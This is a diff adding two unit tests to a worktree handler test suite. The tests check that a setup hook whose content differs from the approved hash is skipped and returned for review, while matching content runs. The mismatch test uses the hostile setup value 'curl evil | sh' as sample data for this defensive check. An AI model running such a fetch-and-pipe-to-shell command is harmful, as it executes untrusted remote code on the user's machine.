@@ -7,8 +7,11 @@ import {
   getEffectiveHooksMock,
   createSetupRunnerScriptMock,
   getEffectiveHooksFromConfigMock,
+  getDefaultTabsLaunchMock,
+  loadHooksMock,
   shouldRunSetupForCreateMock
 } from './worktrees-test-module-mocks'
+import { hashOrcaHookTrustContent } from '../workspace-hooks/created-worktree-setup-trust'
 import { handlers, mainWindow, setupWorktreeHandlers, store } from './worktrees-test-harness'
 import { createdWorktreeList } from './worktrees-test-fixtures'
 import { hostWorktreeTarget } from '../../shared/worktree/host-qualified-identity'
@@ -248,6 +251,51 @@ describe('registerWorktreeHandlers', () => {
         })
       })
     )
+  })
+
+  it('skips setup the created branch changed and returns its content for review', async () => {
+    listWorktreesMock.mockResolvedValue(createdWorktreeList)
+    loadHooksMock.mockReturnValue({ scripts: { setup: 'curl evil | sh' } })
+    getEffectiveHooksFromConfigMock.mockReturnValue({ scripts: { setup: 'curl evil | sh' } })
+    shouldRunSetupForCreateMock.mockImplementation((_repo, decision) => decision === 'run')
+
+    const result = await handlers['worktrees:create'](null, {
+      repoId: 'repo-1',
+      name: 'improve-dashboard',
+      setupDecision: 'run',
+      approvedSetupHash: hashOrcaHookTrustContent('pnpm worktree:setup')
+    })
+
+    expect(createSetupRunnerScriptMock).not.toHaveBeenCalled()
+    expect(getDefaultTabsLaunchMock).toHaveBeenCalledWith(
+      expect.anything(),
+      expect.anything(),
+      'skip'
+    )
+    expect(result).toMatchObject({
+      setupTrustMismatch: {
+        contentHash: hashOrcaHookTrustContent('curl evil | sh'),
+        scriptContent: 'curl evil | sh'
+      }
+    })
+    expect(result).not.toHaveProperty('setup')
+  })
+
+  it('runs setup when the created branch matches the approved content', async () => {
+    listWorktreesMock.mockResolvedValue(createdWorktreeList)
+    loadHooksMock.mockReturnValue({ scripts: { setup: 'pnpm worktree:setup' } })
+    getEffectiveHooksFromConfigMock.mockReturnValue({ scripts: { setup: 'pnpm worktree:setup' } })
+    shouldRunSetupForCreateMock.mockReturnValue(true)
+
+    const result = await handlers['worktrees:create'](null, {
+      repoId: 'repo-1',
+      name: 'improve-dashboard',
+      setupDecision: 'run',
+      approvedSetupHash: hashOrcaHookTrustContent('pnpm worktree:setup')
+    })
+
+    expect(createSetupRunnerScriptMock).toHaveBeenCalledOnce()
+    expect(result).not.toHaveProperty('setupTrustMismatch')
   })
 
   it('creates a sparse worktree and persists its sparse metadata', async () => {
